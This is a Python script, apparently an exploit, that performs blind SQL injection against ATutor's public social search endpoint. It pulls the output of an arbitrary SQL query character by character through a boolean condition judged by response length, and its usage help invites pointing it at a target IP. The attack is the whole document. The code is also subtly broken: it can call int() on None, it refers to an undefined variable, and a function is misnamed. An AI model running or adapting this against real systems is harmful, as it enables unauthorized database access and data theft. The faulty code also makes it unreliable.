import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(0, 127):
        target = f"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={inj_str.replace('[CHAR]', str(j))}"
        r = requests.get(target)
        content_length = int(r.headers.get('Content-Length', 0))
        if content_length > 20:
            return j
    return None

def find_string_length(ip, sql_command):
    length = 1
    while length < 100:
        injection_string = f"test')/**/or/**/(ascii(substring(({sql_command}),%d,1)))=[CHAR]%%23" % length
        test = int(searchFriends_sqli(ip, injection_string))
        if test != 0:
            length += 1
            sys.stdout.write(chr(test))
            sys.stdout.flush()
        elif test == 0:
            break
        else:
            print("\n(+) Unable to retrieve character at position %d" % i)
            break
    print()
    print("(+) Found Length: " + str(length))
    return length

def main():
    if len(sys.argv) != 3:
        print('(+) usage: %s <target> "<sql command>"' % sys.argv[0])
        print('(+) eg: %s 192.168.121.103 "select user()"' % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    sql_command = sys.argv[2]
    print('(+) Running "%s"...' % sql_command)
    sql_command = sql_command.replace(' ', "/**/")

    # Dynamically find the string
    find_string_length(ip, sql_command)

if __name__ == "__main__":
    main()

